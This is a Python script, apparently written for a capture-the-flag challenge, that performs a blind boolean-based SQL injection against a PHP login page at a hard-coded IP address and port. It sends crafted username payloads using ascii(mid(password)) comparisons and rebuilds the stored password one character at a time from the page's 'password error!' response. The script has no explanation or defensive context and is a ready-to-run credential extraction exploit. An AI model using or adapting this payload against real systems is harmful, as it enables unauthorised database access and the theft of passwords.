import requests
import string

cookies = {
    'PHPSESSID': 'vbcrhu066k7kkriti3d69s9i85',
}

headers = {
    'Host': '123.206.31.85:49167',
    'Cache-Control': 'max-age=0',
    'Origin': 'http://123.206.31.85:49167',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Referer': 'http://123.206.31.85:49167/index.php',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7',
}

result = ""
for i in range(1,100):
    for e in range(32,126):
        data = {
          'username': "admin'^(ascii(mid((password)from({})))<>{})#".format(i,e),
          'password': '123456'
        }
        print(data['username'])
        response = requests.post('http://123.206.31.85:49167/index.php', headers=headers, cookies=cookies, data=data)
        if "password error!" in response.text:
            result += chr(e)
            print(result)
            break